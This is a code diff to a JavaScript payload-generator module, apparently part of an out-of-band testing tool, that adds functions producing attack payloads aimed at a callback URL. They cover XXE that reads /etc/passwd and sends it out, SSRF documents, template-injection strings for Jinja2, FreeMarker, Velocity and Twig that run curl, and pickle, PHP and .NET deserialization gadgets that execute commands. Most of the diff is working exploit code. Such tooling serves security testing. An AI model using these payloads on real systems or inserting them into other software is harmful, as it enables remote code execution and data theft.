@@ -150,6 +150,108 @@ SELECT LOAD_FILE('${callbackUrl}');
     oracle: (callbackUrl) => `-- Oracle callback
 SELECT UTL_HTTP.REQUEST('${callbackUrl}') FROM DUAL;
 `
+  },
+
+  // XXE (XML External Entity) payloads
+  xxe: {
+    dtd: (callbackUrl) => `<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '${callbackUrl}?data=%file;'>">
+%eval;
+%exfiltrate;`,
+    xml: (callbackUrl) => `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "${callbackUrl}">
+]>
+<root>
+  <callback>&xxe;</callback>
+</root>`,
+    svg: (callbackUrl) => `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "${callbackUrl}">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+  <text x="10" y="20">&xxe;</text>
+</svg>`,
+    docx: (callbackUrl) => `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE root [
+  <!ENTITY % remote SYSTEM "${callbackUrl}/evil.dtd">
+  %remote;
+]>
+<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+  <w:body>
+    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
+  </w:body>
+</w:document>`,
+    xlsx: (callbackUrl) => `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "${callbackUrl}">
+]>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <sheetData>
+    <row r="1">
+      <c t="inlineStr"><is><t>&xxe;</t></is></c>
+    </row>
+  </sheetData>
+</worksheet>`
+  },
+
+  // SSRF (Server-Side Request Forgery) payloads
+  ssrf: {
+    url: (callbackUrl) => `${callbackUrl}`,
+    xml: (callbackUrl) => `<?xml version="1.0"?>
+<root>
+  <url>${callbackUrl}</url>
+</root>`,
+    json: (callbackUrl) => `{
+  "url": "${callbackUrl}",
+  "callback": "${callbackUrl}",
+  "webhook": "${callbackUrl}"
+}`,
+    yaml: (callbackUrl) => `url: ${callbackUrl}
+callback: ${callbackUrl}
+webhook: ${callbackUrl}`,
+    html: (callbackUrl) => `<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="refresh" content="0;url=${callbackUrl}">
+</head>
+<body>
+  <img src="${callbackUrl}/image.png">
+  <iframe src="${callbackUrl}"></iframe>
+</body>
+</html>`
+  },
+
+  // Template Injection payloads
+  template: {
+    jinja2: (callbackUrl) => `{{ ''.__class__.__mro__[1].__subclasses__()[408]('curl ${callbackUrl}',shell=True,stdout=-1).communicate() }}`,
+    freemarker: (callbackUrl) => `<#assign ex="freemarker.template.utility.Execute"?new()> \${ex("curl ${callbackUrl}")}`,
+    velocity: (callbackUrl) => `#set($x='')
+#set($rt = $x.class.forName('java.lang.Runtime'))
+#set($chr = $x.class.forName('java.lang.Character'))
+#set($str = $x.class.forName('java.lang.String'))
+#set($ex=$rt.getRuntime().exec('curl ${callbackUrl}'))
+$ex.waitFor()`,
+    twig: (callbackUrl) => `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("curl ${callbackUrl}")}}`
+  },
+
+  // Deserialization payloads
+  deserial: {
+    java: (callbackUrl) => `// Java deserialization payload
+// Requires ysoserial tool to generate proper serialized object
+// Example: java -jar ysoserial.jar CommonsCollections1 "curl ${callbackUrl}" | base64
+H4sIAAAAAAAAAJ...base64_payload_here...==`,
+    php: (callbackUrl) => `O:8:"stdClass":1:{s:4:"exec";s:${callbackUrl.length}:"${callbackUrl}";}`,
+    python: (callbackUrl) => `cos
+system
+(S'curl ${callbackUrl}'
+tR.`,
+    dotnet: (callbackUrl) => `<ObjectDataProvider MethodName="Start" ObjectType="{x:Type Process}">
+  <ObjectDataProvider.MethodParameters>
+    <system:String>cmd</system:String>
+    <system:String>/c curl ${callbackUrl}</system:String>
+  </ObjectDataProvider.MethodParameters>
+</ObjectDataProvider>`
   }
 };
 
@@ -178,6 +280,27 @@ export const getMimeType = (format) => {
     mssql: 'text/plain',
     mysql: 'text/plain',
     oracle: 'text/plain',
+
+    // XXE
+    dtd: 'application/xml-dtd',
+    svg: 'image/svg+xml',
+    docx: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
+    xlsx: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
+
+    // SSRF
+    url: 'text/plain',
+    json: 'application/json',
+    yaml: 'application/x-yaml',
+
+    // Template Injection
+    jinja2: 'text/plain',
+    freemarker: 'text/plain',
+    velocity: 'text/plain',
+    twig: 'text/plain',
+
+    // Deserialization
+    java: 'application/octet-stream',
+    dotnet: 'application/xml',
 
     // Default
     txt: 'text/plain'
